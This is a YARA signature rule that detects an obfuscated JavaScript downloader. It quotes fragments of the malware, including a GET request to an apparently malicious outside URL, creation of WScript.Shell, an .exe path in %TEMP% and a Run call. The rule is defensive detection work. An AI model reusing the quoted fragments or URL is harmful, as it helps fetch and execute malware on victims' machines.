rule sig_20160401_57442da56b2ea5682eb736a8fe4e52f3 {
  meta:
    description = "datamaliciousorder - file 20160401_57442da56b2ea5682eb736a8fe4e52f3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5a2ca7dcf243aa466f0a8757fb6df4760b2238bd1a5158d7cd911d31ed8360bf"

  strings:
    $s1  = "IeUc[LmxIm](\"G\" + \"ET\", \"http://langeparis.com.au/s0powa\", false);" fullword ascii
    $s2  = "function HfQqr(WzwIwb, EoLxq){UhFf = UhFf * 1; return WzwIwb - EoLxq;};" fullword ascii
    $s3  = "var ImLsg = function VtXqa() {return WScript[OtbZp](\"WScript\"+\".Shell\");}(), XfLj = 11;" fullword ascii
    $s4  = "if (IeUc[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function SdBwk() {return ImLsg[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"alGblEOxrQUwRzn.ex\" + \"e\";};" fullword ascii
    $s6  = "function WmoDi(){return DuAmf + \"\";};" fullword ascii
    $s7  = "function YfBe() {return ((WrZxl == true) && (WrZxl == BitUe)) ? 1 : UhFf;};" fullword ascii
    $s8  = "var BitUe = false;" fullword ascii
    $s9  = "BitUe = true; " fullword ascii
    $s10 = "function WpIm()" fullword ascii
    $s11 = "function MzyHv(){return 23;};" fullword ascii
    $s12 = "WrZxl = true; " fullword ascii
    $s13 = "var WrZxl = false;" fullword ascii
    $s14 = "function IqPo(AbGre){ImLsg[\"R\"+\"un\"](AbGre, UhFf, UhFf);};" fullword ascii
    $s15 = "function TmIdh(){return OtbZp;};" fullword ascii
    $s16 = "var NnqVb = false;" fullword ascii
    $s17 = "function UgjSiz(ZgiGcv) {var SyBt = (1, 2, 3, 4, 5, ZgiGcv); return SyBt;};" fullword ascii
    $s18 = "return HfQqr(MnOu, WrjQvm);" fullword ascii
    $s19 = "}while (FfsBi);" fullword ascii
    $s20 = "} catch(EnVvm){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}